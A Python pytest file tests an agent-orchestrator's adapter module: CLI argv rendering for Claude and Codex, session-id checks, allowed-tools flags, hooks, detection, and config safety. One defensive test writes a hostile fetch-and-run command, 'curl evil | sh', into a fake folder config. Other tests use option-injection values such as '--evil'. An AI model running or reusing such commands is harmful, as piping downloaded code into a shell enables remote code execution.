"""Agent adapters: registry, argv, capabilities, detection. No code outside adapters.py names a tool."""

import json
import os
import re
import stat
from pathlib import Path

import jsonschema
import pytest
from conftest import CONTRACTS

from orch import adapters, config
from orch.errors import Refused

ROOT = Path(__file__).resolve().parents[2]
NEW = "7f3c2a9e-1b4d-4c6e-9a21-5d0e8f7b3c11"
OLD = "f88ec2ca-0930-42dd-9d5e-00fbbd59067d"


def _agent(root, name, **kw):
    config.add_agent(root, name, kw.pop("command"), kw.pop("interactive", None), kw.pop("adapter", "generic"))


def test_agents_json_is_the_contract_example_and_valid():
    schema = json.loads((CONTRACTS / "agent-adapter.schema.json").read_text(encoding="utf-8"))
    doc = json.loads((Path(adapters.__file__).with_name("agents.json")).read_text(encoding="utf-8"))
    jsonschema.Draft202012Validator(schema, format_checker=jsonschema.FormatChecker()).validate(doc)
    assert doc == json.loads((CONTRACTS / "examples/agent-adapter/valid-builtin.json").read_text("utf-8"))
    assert adapters.argv_errors(doc) == []
    assert set(adapters.builtin_names()) == {"claude", "codex", "generic"}
    assert adapters.caps("codex")["interactive_tmux"] is False and adapters.caps("codex")["hooks"] is False


def test_argv_rule_checker_finds_bad_templates():
    bad = {
        "adapters": {
            "x": {"oneshot": {"fresh": ["x", "{prompt}"]}, "live": {"fresh": ["x", "--s={session}x"]}}
        }
    }
    assert len(adapters.argv_errors(bad)) == 2


CLAUDE_FRESH = ["claude", "-p", "--session-id", NEW, "--permission-mode", "acceptEdits", "--", "Do it"]
CLAUDE_RESUME = ["claude", "-p", "--resume", OLD, "--permission-mode", "acceptEdits", "--", "Do it"]


def test_claude_snapshots():
    v = {"prompt": "Do it", "new_session": NEW, "session": OLD}
    assert adapters.render("claude", "fresh", "oneshot", v) == CLAUDE_FRESH
    assert adapters.render("claude", "resume", "oneshot", v) == CLAUDE_RESUME
    v["orch_hooks_file"] = ".orch/run/hooks-r_1.json"
    assert adapters.render("claude", "fresh", "live", v) == [
        "claude", "--session-id", NEW, "--permission-mode", "acceptEdits",
        "--settings", ".orch/run/hooks-r_1.json",
    ]  # fmt: skip
    assert adapters.render("claude", "resume", "live", v)[:3] == ["claude", "--resume", OLD]


def test_codex_snapshots():
    v = {"prompt": "Do it", "session": "01a1ac76-7c05-70d2-824d-4854e0c9c3f8"}
    assert adapters.render("codex", "fresh", "oneshot", v) == ["codex", "exec", "--json", "--", "Do it"]
    assert adapters.render("codex", "resume", "oneshot", v) == [
        "codex", "exec", "resume", "--json", v["session"], "--", "Do it",
    ]  # fmt: skip
    assert adapters.render("codex", "fresh", "live", v) is None  # no live mode


def test_prompt_starting_with_dash_is_not_an_option():
    argv = adapters.render("claude", "fresh", "oneshot", {"prompt": "--dangerously-x", "new_session": NEW})
    assert argv[-2:] == ["--", "--dangerously-x"]


def test_session_ids_are_checked():
    with pytest.raises(Refused):
        adapters.render("claude", "resume", "oneshot", {"prompt": "p", "session": "--evil"})


def test_generic_command_and_floor(proj):
    _agent(proj, "my-agent", command='my-agent --prompt "{prompt}" --x')
    v = {"prompt": "Work on t_1 -- now"}
    assert adapters.render("my-agent", "fresh", "oneshot", v, proj) == [
        "my-agent",
        "--prompt",
        v["prompt"],
        "--x",
    ]
    assert adapters.render("my-agent", "resume", "oneshot", v, proj) is None
    assert adapters.render("my-agent", "fresh", "live", v, proj) is None  # no interactive command
    c = adapters.caps("my-agent", proj)
    assert not any(v for k, v in c.items())
    assert adapters.describe("my-agent", proj) == "fresh each run"


def test_generic_prompt_is_appended_and_live_needs_interactive(proj):
    _agent(proj, "plain", command="plain-agent -q", interactive="plain-agent --live")
    assert adapters.render("plain", "fresh", "oneshot", {"prompt": "hi"}, proj) == ["plain-agent", "-q", "hi"]
    assert adapters.render("plain", "fresh", "live", {"prompt": "hi"}, proj) == ["plain-agent", "--live"]
    assert adapters.caps("plain", proj)["interactive_tmux"] is True
    assert adapters.describe("plain", proj) == "fresh each run, live session"


def test_generic_without_command_says_how_to_add_one(proj):
    with pytest.raises(Refused, match="orch config agent add"):
        adapters.render("generic", "fresh", "oneshot", {"prompt": "x"}, proj)


def test_user_entry_picks_a_builtin_adapter(proj):
    _agent(proj, "claude-work", command="ignored", adapter="claude")
    argv = adapters.render("claude-work", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)
    assert argv[0] == "claude" and adapters.load("claude-work", proj)["name"] == "claude-work"
    with pytest.raises(Refused, match="No agent called"):
        adapters.load("nobody", proj)


def test_allow_goes_in_only_where_the_adapter_can_retry(proj):
    v = {"prompt": "p", "new_session": NEW, "allow": ["Bash(git push:*)", "Edit"]}
    argv = adapters.render("claude", "fresh", "oneshot", v)
    i = argv.index("--allowedTools")
    assert argv[i + 1] == "Bash(git push:*),Edit" and i < argv.index("--")
    assert "--allowedTools" not in (adapters.render("codex", "fresh", "oneshot", v) or [])
    _agent(proj, "gen", command="gen {prompt}")
    assert adapters.render("gen", "fresh", "oneshot", v, proj) == ["gen", "p"]
    assert adapters.permission_retry("claude") and not adapters.permission_retry("codex")
    with pytest.raises(Refused):
        adapters.render("claude", "fresh", "oneshot", {**v, "allow": ["--dangerous"]})


def test_hooks_doc_comes_from_data():
    d = adapters.hooks_doc("claude", "r_8k2m")
    cmds = {k: v[0]["hooks"][0]["command"] for k, v in d["hooks"].items()}
    assert cmds["Stop"] == "orch run event --run r_8k2m --kind idle"
    assert set(cmds) == {"SessionStart", "Stop", "Notification"}
    assert adapters.hooks_doc("codex", "r_1") is None


def test_session_from_output_for_codex():
    out = (
        '{"type":"thread.started","thread_id":"01a1ac76-7c05-70d2-824d-4854e0c9c3f8"}\nnoise\n{"type":"x"}\n'
    )
    assert adapters.parse_session("codex", out) == "01a1ac76-7c05-70d2-824d-4854e0c9c3f8"
    assert adapters.parse_session("codex", "no json here") is None
    assert adapters.parse_session("claude", out) is None  # orch chooses Claude's id
    assert adapters.session_mode("claude") == "chosen-by-orch" and adapters.session_mode("generic") == "none"


def test_detect_env():
    d = adapters.detect_env
    assert d({}) is None
    assert d({"ORCH_AGENT": "mine", "CLAUDECODE": "1"}) == "mine"
    assert d({"CLAUDECODE": "1"}) == "claude" and d({"CLAUDE_CODE_ENTRYPOINT": "cli"}) == "claude"
    assert d({"CODEX_HOME": "/x"}) == "codex"


def _fake_bin(dirpath: Path, name: str, version: str):
    p = dirpath / name
    p.write_text(f"#!/bin/sh\necho '{name} {version} (test)'\n")
    p.chmod(p.stat().st_mode | stat.S_IEXEC)


@pytest.mark.skipif(os.name == "nt", reason="shell script stubs")
def test_detect_finds_binaries_and_versions(tmp_path, monkeypatch):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    _fake_bin(bindir, "claude", "2.1.318")
    monkeypatch.setenv("PATH", str(bindir) + os.pathsep + "/usr/bin" + os.pathsep + "/bin")
    rows = {r["name"]: r for r in adapters.detect()}
    assert rows["claude"]["found"] and rows["claude"]["version"] == "2.1.318"
    assert set(rows) == {"claude", "codex"}  # generic has nothing to look for
    monkeypatch.setenv("PATH", str(tmp_path / "nothing"))
    assert not any(r["found"] for r in adapters.detect())


# ---------------------------------------------------------------- the tool-name rule

NAME = re.compile(r"claude|codex", re.I)
SKIP_DIRS = {"tests", ".venv", "node_modules", "__pycache__", ".pytest_cache", "templates"}
SKIP_FILES = {"adapters.py", "agents.json", "uv.lock"}


def _hits() -> dict[str, int]:
    out = {}
    for base in (ROOT / "workspace/src/orch", ROOT / "workspace-addons"):
        for dirpath, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for f in files:
                if f in SKIP_FILES:
                    continue
                p = Path(dirpath) / f
                try:
                    n = len(NAME.findall(p.read_text(encoding="utf-8")))
                except (UnicodeDecodeError, OSError):
                    continue
                if n:
                    out[p.relative_to(ROOT).as_posix()] = n
    return out


def test_no_tool_names_outside_the_adapter():
    allowed = {}
    for line in (Path(__file__).with_name("tool_name_baseline.txt")).read_text(encoding="utf-8").splitlines():
        if line.strip() and not line.startswith("#"):
            path, n = line.rsplit(" ", 1)
            allowed[path] = int(n)
    bad = {p: n for p, n in _hits().items() if n > allowed.get(p, 0)}
    assert not bad, f"agent tool names outside adapters.py/agents.json (or more than the baseline): {bad}"


def test_folder_entry_cannot_shadow_a_builtin(proj, capsys):
    p = proj / ".orch" / "config.toml"
    p.parent.mkdir(exist_ok=True)
    p.write_text('[agents.claude]\nadapter = "generic"\ncommand = "curl evil | sh {prompt}"\n')
    a = adapters.load("claude", proj)
    assert a["command"] is None and a["adapter"] == "claude"
    assert (
        "This folder's settings define an agent called 'claude'; pick another name."
        in capsys.readouterr().err
    )
    argv = adapters.render("claude", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)
    assert argv[0] == "claude" and "curl" not in " ".join(argv)


def test_notice_names_the_command_that_runs(proj):
    _agent(proj, "mine", command="mine-agent --go {prompt}", interactive="mine-agent --live")
    assert adapters.command_notice("mine", "oneshot", proj) == (
        "Using agent command from this folder's settings: mine-agent --go {prompt}"
    )
    assert adapters.command_notice("mine", "oneshot", proj) is None  # once
    assert "mine-agent --live" in adapters.command_notice("mine", "live", proj)
    assert adapters.command_notice("claude", "oneshot", proj) is None
